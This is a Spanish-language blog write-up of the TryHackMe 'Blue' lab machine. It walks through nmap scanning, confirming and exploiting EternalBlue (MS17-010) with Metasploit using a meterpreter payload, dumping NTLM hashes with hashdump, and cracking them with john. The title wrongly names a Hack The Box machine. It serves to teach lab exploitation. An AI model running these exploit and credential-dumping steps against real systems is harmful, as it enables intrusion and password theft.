---
layout: single
title: Delivery - Hack The Box
excerpt: "En el siguiente análisis, abordaremos la resolución de la máquina "Blue" en TryHackMe. Esta máquina Windows nos proporcionará una valiosa experiencia para comprender y explotar la vulnerabilidad conocida como EternalBlue. Para llevar a cabo este proceso, comenzaremos con un escaneo utilizando la herramienta Nmap para identificar posibles puntos de entrada. Posteriormente, utilizaremos Metasploit para confirmar la presencia de la vulnerabilidad en el sistema cliente.

Una vez confirmada la vulnerabilidad, nos centraremos en el proceso de dumping de los hashes NTLM para, posteriormente, realizar un ataque de fuerza bruta. Este procedimiento nos permitirá obtener acceso a las credenciales necesarias para avanzar en la explotación de la máquina.

En resumen, este write-up detallará paso a paso el enfoque utilizado para identificar, confirmar y explotar la vulnerabilidad EternalBlue en la máquina Windows "Blue" de TryHackMe, incluyendo la extracción y el uso de los hashes NTLM para avanzar con éxito en la seguridad del sistema.
."
date: 2021-05-22
classes: wide
header:
  teaser: /assets/images/tryhme-writeup-blue/Blue_card_Dark.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - TryHackMe
  - EternalBlue
tags:  
  - windows
  - metasploit
  - tryhackme
---

![](/assets/images/tryhme-writeup-blue/Blue_card_Dark.png)

--------------------------
## Resumen 

En el siguiente análisis, abordaremos la resolución de la máquina "Blue" en TryHackMe. Esta máquina Windows nos proporcionará una valiosa experiencia para comprender y explotar la vulnerabilidad conocida como EternalBlue. Para llevar a cabo este proceso, comenzaremos con un escaneo utilizando la herramienta Nmap para identificar posibles puntos de entrada. Posteriormente, utilizaremos Metasploit para confirmar la presencia de la vulnerabilidad en el sistema cliente.

Una vez confirmada la vulnerabilidad, nos centraremos en el proceso de dumping de los hashes NTLM para, posteriormente, realizar un ataque de fuerza bruta. Este procedimiento nos permitirá obtener acceso a las credenciales necesarias para avanzar en la explotación de la máquina.

En resumen, este write-up detallará paso a paso el enfoque utilizado para identificar, confirmar y explotar la vulnerabilidad EternalBlue en la máquina Windows "Blue" de TryHackMe, incluyendo la extracción y el uso de los hashes NTLM para avanzar con éxito en la seguridad del sistema.


--------------------------

## Escaneo de puertos

primero hacemos un escaneo con nmap para así poder obtener información de los puertos abiertos .

```bash
nmap -p- -Pn  --min-rate 5000 10.10.174.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 09:11 AKST
Warning: 10.10.174.11 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.174.11 (10.10.174.11)
Host is up (0.17s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
954/tcp   filtered unknown
3389/tcp  open     ms-wbt-server
4641/tcp  filtered unknown
5873/tcp  filtered unknown
15193/tcp filtered unknown
27420/tcp filtered unknown
32765/tcp filtered unknown
36363/tcp filtered unknown
37145/tcp filtered unknown
39913/tcp filtered unknown
41149/tcp filtered unknown
41562/tcp filtered unknown
43791/tcp filtered unknown
44635/tcp filtered unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49158/tcp open     unknown
49160/tcp open     unknown
52686/tcp filtered unknown
57256/tcp filtered unknown
59033/tcp filtered unknown
59056/tcp filtered unknown
61208/tcp filtered unknown
64921/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 32.63 seconds

```

ahora que tenemos el numero de puertos abiertos lo que haremos es ejecutar los script de nmap para validar cuales de estos contienen alguna vulnerabilidad o algún servicio corriendo 

```bash
nmap -p135,139,445,954,3389,4641,5873,15193,27420,32765,36363,37145,39913,41149,41562,43791,44635,49152,49153,49154,49158,49160,52686,57256,59033,59056,61208,64921 -sCV --script="vuln and safe" -Pn 10.10.174.11
Nmap scan report for 10.10.174.11 (10.10.174.11)
Host is up (0.16s latency).

PORT      STATE  SERVICE      VERSION
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
954/tcp   closed unknown
3389/tcp  open   tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
4641/tcp  closed unknown
5873/tcp  closed unknown
15193/tcp closed unknown
27420/tcp closed unknown
32765/tcp closed unknown
36363/tcp closed unknown
37145/tcp closed unknown
39913/tcp closed unknown
41149/tcp closed unknown
41562/tcp closed unknown
43791/tcp closed unknown
44635/tcp closed unknown
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49158/tcp open   msrpc        Microsoft Windows RPC
49160/tcp open   msrpc        Microsoft Windows RPC
52686/tcp closed unknown
57256/tcp closed unknown
59033/tcp closed unknown
59056/tcp closed unknown
61208/tcp closed unknown
64921/tcp closed unknown
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.87 seconds

```

y como podemos ver nmap nos devuelve que el host es vulnerable a Eternal Blue que se identifica con el cve **CVE:CVE-2017-0143** , así que iniciamos Metasploitpara poder verificar esta vulnerabilidad y explotarla.

```bash
service postgresql start && msfconsole
```
![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228133642.png)

con esto buscamos la palabra **eternalbue** para ver los módulos que se encuentran en metasploit sobre esta vulnerabilidad 

```bash
search eternalblue
```

![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228133832.png)

entonces para verificar que dentro de la maquina victima si se encuentra la vulnerabilidad de eternal blue utilizamos el siguiente modulo

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

donde configuramos el scanner para que tome como host la ip de la victima 

```bash
set RHOSTS 10.10.174.11
```
![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228134134.png)

y ponemos a correr el escáner 

```bash
run
```
![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228134222.png)

-------

## Explotación

para la explotacion utilizamos el modulo de **ms17_010_eternalblue** de metasploit ,donde cambiaremos el **rhosts** por la ip de la victima y cambiamos el **lhost** por nuestra ip

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.174.11
set lhost 10.8.245.39
```

y para hacer la escala de privilegios como pide tryhackme cambiamos el payload por el siguiente

```bash
set payload windows/x64/meterpreter/bind_tcp
```

![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228135314.png)

ahora ejecutamos el exploit y podemos ver que obtenemos una shell con la maquina victima 

```bash
run
```

![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228135817.png)

entonces ya obtendremos acceso al sistema 

---------

## Post Explotación

ahora que ya tenemos acceso al sistema podemos hacer diferentes cosas ,como obtener los hash de todos los usuarios del sistema con el siguiente comando

```bash
hashdump
```

![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228141101.png)

lo que haremos es tomar la linea de jon que es la siguiente

```bash
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

y ustedes se preguntan ,que es esta cadena? ,esta cadena es aquella cadena guardada por windows en  el protocolo NTLM que se divide de la siguiente manera

1. **Jon**: Este es el nombre de usuario asociado con la entrada. En este caso, el nombre de usuario es "Jon".
2. **1000**: Este número es el identificador de usuario (UID). En sistemas Unix y Linux, este número se utiliza para identificar de manera única a un usuario.
3. **aad3b435b51404eeaad3b435b51404ee**: este es el LM hash (Lan Manager hash) es un antiguo algoritmo de hash utilizado para almacenar las contraseñas en sistemas Windows, especialmente en versiones más antiguas del sistema operativo. Fue desarrollado por Microsoft y se utilizó principalmente en los sistemas Windows hasta Windows XP y Windows Server 2003. Sin embargo, debido a sus debilidades de seguridad, el uso de LM hash se ha desaconsejado en versiones más recientes de Windows.
4. **ffb43f0de35be4d9917ac0cc8ad57f8d**:  Este es el hash NTLM de la contraseña. NTLM es un protocolo de autenticación ampliamente utilizado en entornos de Windows. El hash es una representación encriptada de la contraseña.

ahora tomamos el NTLM hash para poder hacer fuerza bruta con la herramienta john y poder tener en texto plano su contraseña

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![](/assets/images/tryhme-writeup-blue/Pasted_image_20231228143749.png)

